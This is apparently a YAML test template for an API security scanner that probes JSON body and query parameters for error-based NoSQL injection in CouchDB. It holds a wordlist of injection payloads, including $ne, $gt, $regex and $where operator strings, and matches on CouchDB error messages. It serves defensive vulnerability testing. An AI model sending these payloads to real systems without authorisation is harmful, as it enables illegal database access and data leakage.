id: NOSQLI_ERROR_BASED_PARAM_COUCHDB_SPECIAL_CHARACTERS
info:
  name: "Error Based NoSQL Injection test for JSON Body Parameters for CouchDB Error"
  description: >
    "Some API endpoints expecting JSON Body parameter values might be directly exposed to CouchDB. 
    Attackers can trigger an error by breaking the structure of the functions\' parameters used 
    for communicating with the database. "
  details: >
    "Some API endpoints expecting JSON Body parameter values might be directly exposed to CouchDB.
    CouchDB uses NoSQL. Causing an error in NoSQL query syntax can expose the underlying query or DB data."
  impact: >
    "Possible data leakage due to illegal DB access. Successful NoSQL injection attacks 
    may completely compromise or destroy a system."
  category:
    name: SQL
    shortName: Injection Attack
    displayName: Injection Attacks (SQL)
  subCategory: NOSQLI_ERROR_BASED_PARAM_COUCHDB_SPECIAL_CHARACTERS
  severity: HIGH
  tags:
    - Injection Attack
    - OWASP Top 10
    - HackerOne Top 10
  references:
    - "https://github.com/Charlie-belmer/nosqli"
    - "https://owasp.org/www-community/Injection_Flaws"
  cwe:
    - CWE-943
    - CWE-89

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    contains_either:
      - POST
      - GET
      - PUT
      - PATCH
  or:
    - request_payload:
        for_one:
          key:
            regex: .*
            extract: changed_body_key
    - query_param:
        for_one:
          key:
            regex: .*
            extract: changed_query_key
wordLists:
  specialCharacters:
    - "'"
    - "\""
    - "$"
    - "."
    - ">"
    - "[\",\"]"
    - "{\"$gt\": \"\"}"
    - "{\"$ne\": \"nonexistentname\"}"
    - "{\"$where\": \"function() { throw 'Error'; }\"}"
    - "{\"$where\": \"function() { return true; }\"}"
    - "{\"$regex\": \".*\"}"
    - "{\"$regex\": \"^S\"}"
    - "{\"$gt\": \"\", \"$where\": \"function() { return (this.name.length > 3); }\""
execute:
  type: single
  requests:
    - req:
        - modify_body_param: 
            changed_body_key: ${specialCharacters}
        - modify_query_param:
            changed_query_key: ${specialCharacters}
validate:
  response_payload:
    regex: "illegal_docid"
  response_payload:
    regex: "query_parse_error"
  response_payload:
    regex: "invalid_json"